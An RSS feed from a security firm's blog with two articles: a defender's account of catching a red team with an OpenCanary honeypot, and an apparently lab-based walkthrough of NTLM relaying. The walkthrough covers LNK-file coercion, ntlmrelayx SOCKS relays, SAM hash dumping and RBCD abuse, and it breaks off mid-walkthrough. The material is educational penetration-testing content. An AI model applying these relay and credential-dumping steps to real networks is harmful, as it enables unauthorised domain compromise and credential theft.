<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>JUMPSEC – Latest Articles</title>
    <link>//localhost:1313/articles/</link>
    <description>Recent content in Latest Articles on JUMPSEC</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-GB</language>
    
	  <atom:link href="//localhost:1313/articles/index.xml" rel="self" type="application/rss+xml" />
    
    
      
        
      
    
    
    <item>
      <title>Active Cyber Defence - Taking back control</title>
      <link>//localhost:1313/articles/2024/10/2024-10-15-active-cyber-defence-taking-back-control/</link>
      <pubDate>Tue, 15 Oct 2024 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2024/10/2024-10-15-active-cyber-defence-taking-back-control/</guid>
      <description>
        
        
        &lt;p&gt;Every good cybersecurity article needs a Sun Tzu quote, here is one lesser known quote from Sun Tzu to start us off.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/1.png&#34; title=&#34;1&#34; alt=&#34;Yeah getting a Domain Admin is cool but have you ever caught a Red Team using a Honeypot? Sun Tzu&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h2&gt;What Happened?&lt;span class=&#34;absolute -mt-20&#34; id=&#34;what-happened&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#what-happened&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Recently, JUMPSEC’s Detection and Response Team (DART) caught a Red Team  inside one of our MxDR clients&amp;rsquo; networks using a honeypot server. The honeypot server was set up using Thinkst Applied Research’s project called &lt;a href=&#34;https://github.com/thinkst/opencanary&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;OpenCanary&lt;/a&gt;. This open-source project from Thinkst emulates different network protocols and when interacted with, creates an alert providing information to the defensive team, such as the source of the request.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h2&gt;An unfair advantage&lt;span class=&#34;absolute -mt-20&#34; id=&#34;an-unfair-advantage&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#an-unfair-advantage&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;We believe all organisations should be able to incrementally build on their level of security, year-on-year. This means leaving generic behind and focusing on the specific threats you face, and outcomes you need to be secure from them. To do this, we draw on the expertise and attacker mindset of our offensive Team to develop sophisticated attack paths tailored to each client’s environment. These are then used to test the defences and monitoring systems set up by our Detection and Response Team (DART).&lt;/p&gt;
&lt;p&gt;As a member of the DART working on the defensive side, I find these engagements particularly rewarding. I’m confident that this sentiment is shared by the offensive team and our clients as well, since both teams ultimately work together to strengthen the security of our client.&lt;/p&gt;
&lt;p&gt;This collaborative, and at times competitive, dynamic between the teams where the defensive team gains insights into the inner workings of exploit tools, while the offensive team learns how to avoid detection, helps us to create new detections and anticipate potential future evasion techniques.&lt;/p&gt;
&lt;p&gt;If you are a Blue Teamer or working on the defensive side in a SOC and have experienced a Purple team engagement, you may have noticed that almost always the offensive team will achieve their set objectives. Often this is thanks to the client’s IT admins with their easy-to-guess passwords which are set to never expire, or SMB shares with credentials in a cleartext file, or thanks to Active Directory Certificate Services; a gift that keeps on giving&lt;/p&gt;
&lt;p&gt;Detection and or prevention for all of these techniques is a challenge for a defender.&lt;/p&gt;
&lt;p&gt;One can only cover so many techniques from MITRE ATT&amp;amp;CK bingo.&lt;/p&gt;
&lt;p&gt;[learn_more caption=&amp;ldquo;MITRE ATT&amp;amp;CK bingo.&amp;rdquo; state=&amp;ldquo;open&amp;rdquo;] The process of shouting “Bingo!” when you have covered a technique from the ATT&amp;amp;CK matrix. Just because you have identified a single way to detect a technique does not mean you can colour the box green, adversaries have multiple ways they can perform most techniques. &lt;a href=&#34;https://attack.mitre.org/resources/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Read more about how NOT to use ATT&amp;amp;CK&lt;/a&gt;  [/learn_more]&lt;/p&gt;
&lt;p&gt;To make matters more complicated, your adversary—in this case, the offensive team—sometimes starts with access to the client&amp;rsquo;s network (an assumed breach), which is common practice when aiming to fully leverage the offensive team&amp;rsquo;s capabilities.&lt;/p&gt;
&lt;p&gt;So, you can quickly imagine the offensive team enumerating and accessing network shares as a regular user only to discover admin credentials within a PowerShell script. In some cases we have seen these  scripts were created by an IT admin with domain admin privileges to automate various tasks and simplify their work. You might think this scenario is uncommon, however it is how &lt;a href=&#34;https://arstechnica.com/information-technology/2022/09/uber-was-hacked-to-its-core-purportedly-by-an-18-year-old-here-are-the-basics/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Uber was hacked&lt;/a&gt; in 2022 and this happens so frequently that there are memes on X/Twitter on the topic.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/4-249x300.jpg&#34; title=&#34;4&#34; alt=&#34;4&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;4&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;As a defender all those latest detections you put in place to detect Mimikatz or the sophisticated bloodhound queries are now useless. The adversary (again, the offensive team in this case) got the keys to the castle and can stroll right through the front door. This situation can feel like an overwhelming challenge and an unfair advantage for the adversary, so what’s a defender to do?&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/5.gif&#34; title=&#34;5&#34; alt=&#34;5&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;5&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Go ahead, cry if you need to—let it out. But no, that&amp;rsquo;s not where it ends. I&amp;rsquo;m not saying you shouldn&amp;rsquo;t cry, but after you do, it&amp;rsquo;s time to regain control.&lt;/p&gt;
&lt;h2&gt;&amp;ldquo;No more tears&amp;rdquo; formula&lt;span class=&#34;absolute -mt-20&#34; id=&#34;no-more-tears-formula&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#no-more-tears-formula&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Consider it this way: an adversary has entered your environment, but it&amp;rsquo;s your environment—you know what happens in this environment from the logs you have and pretty dashboards that you see everyday, you know which of your IT admins still use &lt;a href=&#34;https://attack.mitre.org/software/S0029/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;PsExec&lt;/a&gt; to troubleshoot problems on remote servers, you know which developer has created a script that bruteforces your entire AD user database just to create an inventory of users. Now, the attacker is on your turf, and you set the rules of engagement. You control what they see, what they interact with, and how you can use this knowledge to your advantage.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/6.png&#34; title=&#34;6&#34; alt=&#34;I want to play a game&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;6&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Instead of passively waiting for an alert to trigger, you take an active role in countering the threat actor through Active Cyber Defence. This involves proactively engaging, disrupting, and countering the attack. To clarify, this isn&amp;rsquo;t about hacking back. Rather, it&amp;rsquo;s about setting traps within your environment and waiting for the threat actor to interact with them—one type of trap is is known as a honeytoken. Honeytokens are decoys that are designed to detect unauthorised or malicious activity within a system in your network. They can take many forms, such as fake credentials, files, user accounts that seem legitimate but are actually traps. When an attacker interacts with a honeytoken, it triggers an alert, allowing the defenders to detect a breach or malicious intent early.  The challenge then becomes how to implement this strategy in a way that is easy to deploy, maintain, and most importantly, doesn&amp;rsquo;t increase your attack surface.&lt;/p&gt;
&lt;p&gt;Let’s revisit what actually happened in the incident I mentioned previously after being challenged by an assumed breach in one of our Managed Extended Detection &amp;amp; Response (MxDR) clients, we realised the need to improve our response and regain control. Over the years, we had developed numerous detection use cases in collaboration with our offensive team, but on the flip side, the offensive team also created bypass techniques and constantly introduced new evasion strategies. We needed a quick win—something that would provide us with high-fidelity alerts as early as possible in the attack cycle, or in some cases, even at an advanced stage of the adversary&amp;rsquo;s objectives.&lt;/p&gt;
&lt;p&gt;We deployed &lt;a href=&#34;https://github.com/thinkst/opencanary&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;OpenCanary&lt;/a&gt;; a free and open-source decentralised honeypot by the amazing people at Thinkst Applied Research. We configured that server to expose fake SSH and HTTP servers. The HTTP server had a web page that looked like this.&lt;/p&gt;
&lt;p&gt;An old Synology DiskStation NAS server with usernames and passwords fields. Now tell me if you are an offensive security consultant who has done a little HackTheBox boxes or played in CTF what’s the first thing you are going to do to this page?&lt;/p&gt;
&lt;p&gt;Naturally, you&amp;rsquo;d try &lt;code&gt;admin/admin&lt;/code&gt; or &lt;code&gt;admin/password&lt;/code&gt; combinations. If not, I might question your L33T hacker credentials and that’s exactly what the offensive team in question did during their reconnaissance. The mere fact that they visited this page had already triggered an alert in our system. No one was supposed to access this page, and its existence was known to only a few people. Only the offensive team, after scanning the entire network, discovered this server with an exposed, outdated HTTP service and decided to take their shot.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;In combat, deception can strengthen the weaker side. When all other factors are equal the more deceptive player or the team will always win. - Barton Whaley&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;I had configured this alert to be sent to two different outputs (Google + Slack). When I first saw the alert, I was in complete disbelief. My mind started racing—the excitement, the adrenaline. Thoughts like “There’s no way,” “This can’t be real,” “It must be a misfire from the canary server restarting,” kept running through my head. But then I remembered, I had fine-tuned that alert a long time ago. “Did I really just catch something…?” No, that can’t be it. I needed to double-check—actually, triple-check—to be sure.&lt;/p&gt;
&lt;p&gt;[box type=&amp;ldquo;shadow&amp;rdquo;]&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;{ &amp;ldquo;dst_host&amp;rdquo;: &amp;ldquo;172.XX.X.X&amp;rdquo;, &amp;ldquo;dst_port&amp;rdquo;: 80, &amp;ldquo;local_time&amp;rdquo;: &amp;ldquo;2024-06-19 13:20:12.162738&amp;rdquo;, &amp;ldquo;local_time_adjusted&amp;rdquo;: &amp;ldquo;2024-06-19 13:20:12.162764&amp;rdquo;, &amp;ldquo;logdata&amp;rdquo;: { &amp;ldquo;HOSTNAME&amp;rdquo;: &amp;ldquo;10.XXX.XXX.XX&amp;rdquo;, &amp;ldquo;PASSWORD&amp;rdquo;: &amp;ldquo;&amp;rdquo;, &amp;ldquo;PATH&amp;rdquo;: &amp;ldquo;/index.html&amp;rdquo;, &amp;ldquo;SKIN&amp;rdquo;: &amp;ldquo;nasLogin&amp;rdquo;, &amp;ldquo;USERAGENT&amp;rdquo;: &amp;ldquo;Mozilla/5.0 (Windows NT 6.4;) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.2535.51 Safari/537.36 Edge/125.0.2535.10122&amp;rdquo;, &amp;ldquo;USERNAME&amp;rdquo;: &amp;ldquo;admin&amp;rdquo; }, &amp;ldquo;logtype&amp;rdquo;: 3001, &amp;ldquo;node_id&amp;rdquo;: &amp;ldquo;CANARY-SERVER&amp;rdquo;, &amp;ldquo;src_host&amp;rdquo;: &amp;ldquo;10.XXX.XXX.XX&amp;rdquo;, &amp;ldquo;src_port&amp;rdquo;: 44214, &amp;ldquo;utc_time&amp;rdquo;: &amp;ldquo;2024-06-19 13:20:12.162760&amp;rdquo; }&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Details of alert [/box]&lt;/p&gt;
&lt;p&gt;So, I triple-checked. The client had an ongoing assumed breach engagement, but I wasn’t directly involved in the day-to-day alerts. I looped in my fellow DART members for a sanity check, and we agreed to raise it with the client to confirm, just to be absolutely certain. And yes, we did it.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/celebrate.gif&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;You might think it’s not such a big achievement, but let me tell you…as a Defender, catching an attacker in the assumed breach, right in their reconnaissance stage, using such a simple tool is nothing short of incredible. The satisfaction that comes from outmanoeuvring them before they even trigger other detections is beyond words. This is the kind of victory that reinforces why we do what we do—staying one step ahead and stopping the threat before it even starts.&lt;/p&gt;
&lt;p&gt;We chose OpenCanary over other honeypots like Cowrie, Mailoney, and Snare for several reasons, but the primary one is its ease of deployment—especially if you have Docker installed on your host. It&amp;rsquo;s modular and can simulate various services such as SSH, FTP, HTTP, and VNC, plus it can send alerts directly to a webhook. This makes deployment and maintenance straightforward. In contrast, using multiple honeypot services would require installing each one separately, collecting their logs, forwarding them to a centralised SIEM, and setting up alerts there. If any part of that pipeline fails, you risk missing your most critical alerts.&lt;/p&gt;
&lt;p&gt;Deploying OpenCanary is straightforward, but some maintenance is needed depending on your environment. If you&amp;rsquo;re using regular vulnerability scanners like Nessus or network mapping tools like PRTG Network Monitor, you&amp;rsquo;ll want to add those IP ranges to the &lt;code&gt;ip.ignorelist&lt;/code&gt; in the configuration file to avoid false alarms. After that, you can connect it to your Teams or GoogleChat via webhook, forward the alerts to your SIEM, or set up email notifications—whatever works best for you. Once configured, you can set it and forget it.&lt;/p&gt;
&lt;p&gt;Setting up a server like OpenCanary is just one of many ways to set traps for your adversaries. For instance, you can create multiple fake user accounts in Active Directory, each with different roles. (Pro tip: Use ChatGPT to help you generate realistic fake personas and create fake LinkedIn profiles for them.) Ensure these accounts have complex passwords, and configure your SIEM to alert you if anyone tries to authenticate them. If you use Microsoft Defender for Identity(MDI), you can designate these accounts as honeytokens, and MDI will handle the rest (&lt;a href=&#34;https://learn.microsoft.com/en-us/defender-for-identity/entity-tags%29&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://learn.microsoft.com/en-us/defender-for-identity/entity-tags)&lt;/a&gt;. This is particularly useful during the Red Team&amp;rsquo;s reconnaissance phase when they might use tools like BloodHound to enumerate users from the Domain Controller—triggering an alert in the process. It&amp;rsquo;s a simple win that saves you from having to baseline requests sent to the DC for your detection queries.&lt;/p&gt;
&lt;p&gt;Additionally, you can visit &lt;a href=&#34;https://canarytokens.org&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;canarytokens.org&lt;/a&gt; to easily create various types of Canary tokens, such as Microsoft Word/Excel or PDF documents that trigger an alert when opened. These files can be strategically placed in your organisation&amp;rsquo;s internal shares. Tools like &lt;a href=&#34;https://github.com/blacklanternsecurity/MANSPIDER&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;MANSPIDER&lt;/a&gt;, which crawl SMB shares in search of valuable data, may stumble upon and activate these Canarytokens.&lt;/p&gt;
&lt;p&gt;One of my favourite examples involves using a &amp;ldquo;Fast Redirect Token&amp;rdquo; from &lt;a href=&#34;https://canarytokens.org&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;canarytokens.org&lt;/a&gt; which alerts when someone visits your URL.&lt;/p&gt;
&lt;p&gt;Here is one of our Senior Security Consultants I lured into triggering this alert and getting rickrolled in the process.&lt;/p&gt;
&lt;p&gt;I&amp;rsquo;ll wrap up this blog post by encouraging you to implement Cyber Deception techniques in your environment. These methods aren&amp;rsquo;t new, are often free, easy to set up, and offer some of the most reliable alerts available.&lt;/p&gt;
&lt;p&gt;If you&amp;rsquo;re interested in learning more about Cyber Deception, I highly recommend checking out John Strand’s course, which you can find here: &lt;a href=&#34;https://www.antisyphontraining.com/course/active-defense-and-cyber-deception-with-john-strand/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Active Defense and Cyber Deception with John Strand&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Additionally, be sure to explore the free Canary Tokens service provided by the fantastic team at Thinkst: &lt;a href=&#34;https://canarytokens.org/nest/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Canary Tokens&lt;/a&gt;.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>NTLM Relaying - Making the Old New Again</title>
      <link>//localhost:1313/articles/2024/09/2024-09-17-ntlm-relaying-making-the-old-new-again/</link>
      <pubDate>Tue, 17 Sep 2024 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2024/09/2024-09-17-ntlm-relaying-making-the-old-new-again/</guid>
      <description>
        
        
        &lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/davesbloggie.gif&#34; title=&#34;davesbloggie&#34; alt=&#34;davesbloggie&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;davesbloggie&lt;/figcaption&gt;
  &lt;/figure&gt;I am old enough to remember that it was not always possible to get domain admin within the first hour of a test via Active Directory Certificate Services (ADCS) misconfigurations or over permissioned SCCM NAA accounts. At present we are spoilt for choice in regards to privilege escalation vectors within the on-premise AD environment&amp;rsquo;s, but I wanted to take a look at some of the other misconfigurations that proved to be fruitful before the advent of ADCS and SCCM and continue to land me quick wins on engagements, such as:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Lack of SMB signing&lt;/li&gt;
&lt;li&gt;Lack of LDAP signing and/or channel binding&lt;/li&gt;
&lt;li&gt;Machine Account Quota &amp;gt; 0&lt;/li&gt;
&lt;li&gt;NTLM relaying&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The undelaying exploits are not new here, only the old revisited, but just maybe some of the modern techniques for abusing them have slipped your mind in the rush to abuse ESC1. These techniques should be part of your on-premise AD toolkit, so let&amp;rsquo;s jump into the details.&lt;/p&gt;
&lt;p&gt;Below is a diagram of my very basic KENNEDY.local home domain setup consisting of:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1x Windows Server acting as Domain Controller: KENNEDY-DC (192.168.0.137)&lt;/li&gt;
&lt;li&gt;1x Windows Server acting as Certificate Authority: KENNEDY-CA (192.168.0.84)&lt;/li&gt;
&lt;li&gt;1x Windows 10 Workstation: ELISH (192.168.0.99)&lt;/li&gt;
&lt;li&gt;1x Kali VM acting as Attacker (192.168.0.203)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/1.png&#34; title=&#34;1&#34; alt=&#34;1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;The users will be:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;jkennedy (standard domain user)&lt;/li&gt;
&lt;li&gt;ekennedy (administrative user)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;strong&gt;Lack of SMB Signing&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;lack-of-smb-signing&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#lack-of-smb-signing&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Nothing illustrates the power of the SMB signing vulnerability quite like LNK files placed on shares. My favourite tool for demonstrating this, is the ‘slinky’ module on ‘&lt;a href=&#34;https://github.com/Pennyw0rth/NetExec&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;nxc&lt;/a&gt;’.&lt;/p&gt;
&lt;p&gt;You can build up a list of all the machines with SMB signing as ‘false’ with the following command:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;nxc smb targets.txt --gen-relay-list nosigning.txt&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;But in my small lab I can just manually check the machines like so:&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/2-1.png&#34; title=&#34;2 1&#34; alt=&#34;2 1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;2 1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;We can see above that the ELISH machine has no signing so it won’t be able to identify for sure who is authenticating to it over the SMB protocol.&lt;/p&gt;
&lt;p&gt;With that in mind we first use nxc to analyse the KENNEDY-CA machine to see if we have any available writable directories for us to place our LNK file and it identifies the ‘share’ directory:&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/3-1.png&#34; title=&#34;3 1&#34; alt=&#34;3 1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;3 1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;We then use slinky to create a LNK file on this share which points back to our Kali VM 192.168.0.203. Now when anyone enters that share via file explorer (not command line) and without even clicking it the LNK file will be triggered and their authentication will be sent back to the attackers Kali machine.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/4-1.png&#34; title=&#34;4 1&#34; alt=&#34;4 1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;4 1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Back at the attackers Kali machine we set up a &lt;a href=&#34;https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ntlmrelayx&lt;/a&gt; listener for any authentications coming in and, if any are received, we target the 192.168.0.99 machine where we know signing is disabled. At that point ntlmrelayx can automatically open a socks connection with that machine as the user who entered the share using their authentication. We are essentially carrying out a man in the middle attack.&lt;/p&gt;
&lt;p&gt; &lt;figure&gt;
    &lt;img src=&#34;images/5-1.png&#34; title=&#34;5 1&#34; alt=&#34;5 1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;5 1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;When the authentication comes in after ‘ekennedy’ enters the share, we get a hit, and a socks connection is opened with the 192.168.0.99 machine that has no signing as shown:&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/6-1.png&#34; title=&#34;6 1&#34; alt=&#34;6 1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;6 1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;A persistent socks connection is then maintained within ntlmrelayx which is visible when you enter the ‘socks’ command as shown:&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/7-1.png&#34; title=&#34;7 1&#34; alt=&#34;7 1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;7 1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;We can then edit our proxychains configuration file to allow us to access this socks connection to the remote machine, which uses port 1080 by default:&lt;/p&gt;
&lt;p&gt;In ‘/etc/proxychains4.conf’ add the line “socks4 127.0.0.1 1080”&lt;/p&gt;
&lt;p&gt;Now using proxychains we can dump the sam data given that the ‘ekennedy’ authentication was of an Administrator. It should be noted we don’t need a password at this point using nxc, given we are using a live socks tunnel which has already been authenticated over NTLM.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/8-2.png&#34; title=&#34;8 2&#34; alt=&#34;8 2&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;8 2&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Taking complete control of this machine is now trivial with the hashes received. In the above scenario, ntlmrelayx was used to relay the ‘ekennedy’ admin authentication to just 1 machine but in practice it could relay it to 50 machines with SMB signing off, therefore opening up 50 admin socks connections to pick and choose from.&lt;/p&gt;
&lt;p&gt;This most certainly has happened to me on a real test.&lt;/p&gt;
&lt;p&gt;Next up are 2 techniques that rely less on luck, especially if you are impatient waiting for someone to trigger a LNK file.&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;LDAP Signing - RBCD&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;ldap-signing---rbcd&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#ldap-signing---rbcd&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Similar to SMB signing, LDAP signing - or the lack there of - allows attackers to send HTTP authentication to the LDAP service available on a Domain Controller (DC) but, because signing is disabled, the DC is unable to verify that the authentication coming in is from the actual machine that sent it. This, once again, opens up the possibility of MiTM attacks.&lt;/p&gt;
&lt;p&gt;First we check the ‘KENNEDY-DC’ machine to see if LDAP signing or channel binding is enforced, which it isn’t.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/9.png&#34; title=&#34;9&#34; alt=&#34;9&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;9&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;We then search for a machine that has a WebClient running on the network using nxc’s &amp;lsquo;webdav&amp;rsquo; module as shown below, and we can see that the ‘KENNEDY-CA’ machine has it enabled. Why are we interested in webdav? Well, we can coerce the WebClient service to authenticate back to us over HTTP:&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/10.png&#34; title=&#34;10&#34; alt=&#34;10&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;10&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;From our attacker’s Kali machine, we now launch ntlmrelayx to target LDAPS of ‘KENNEDY-DC’ and when doing so to use the the ‘delegate access’ flag  to launch a RBCD attack on that machine.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/11.png&#34; title=&#34;11&#34; alt=&#34;11&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;11&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;In simple terms what delegate access does is create a new machine on the network and gives the new machine permissions over the machine whose authentication we have passed to the DC. These permissions allow us, as the attacker, to impersonate anyone else on the machine (e.g. an administrator).&lt;/p&gt;
&lt;p&gt;To now force the WebClient to authenticate to ntlmrelayx, we first launch &lt;a href=&#34;https://github.com/lgandx/Responder&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Responder&lt;/a&gt;. Ensure its HTTP and SMB servers are turned off, as we don’t want to catch the authentication with this tool but instead using ntlmrelayx.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/12.png&#34; title=&#34;12&#34; alt=&#34;12&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;12&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;The only reason we use Responder is to provide us with a ‘Machine Name’ on the network that we can use to advertise itself and receive authentications into our Kali machine. This machine name can be seen below:&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/13.png&#34; title=&#34;13&#34; alt=&#34;13&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;13&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;We now coerce the ‘KENNEDY-CA’ (192.168.0.84) machine to authenticate to our attacker Kali Responder machine over HTTP, then relay that authentication to ‘KENNEDY-DC’, which will be unable to verify who is authenticating to it. The call back to our Responder machine instead hits our ntlmrelayx server, listening on port 80:&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/14.png&#34; title=&#34;14&#34; alt=&#34;14&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;14&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;After executing that command, ntlmrelayx forwards the authentication to ‘KENNEDY-DC’ with LDAP signing disabled, and we receive a new machine on the network with a random name, called ‘KQCLXPVT$’. This new machine will also present added information required to impersonate users on the ‘KENNEDY-CA’ server.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/15.png&#34; title=&#34;15&#34; alt=&#34;15&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;15&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;This new machine can now be seen in Active Directory as shown:&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/16.png&#34; title=&#34;16&#34; alt=&#34;16&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;16&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Using the module named ‘group-mem’ that I wrote for nxc we can now see who we would like to impersonate by looking up the privileged ‘Domain Admins’ members:&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/17.png&#34; title=&#34;17&#34; alt=&#34;17&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;17&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
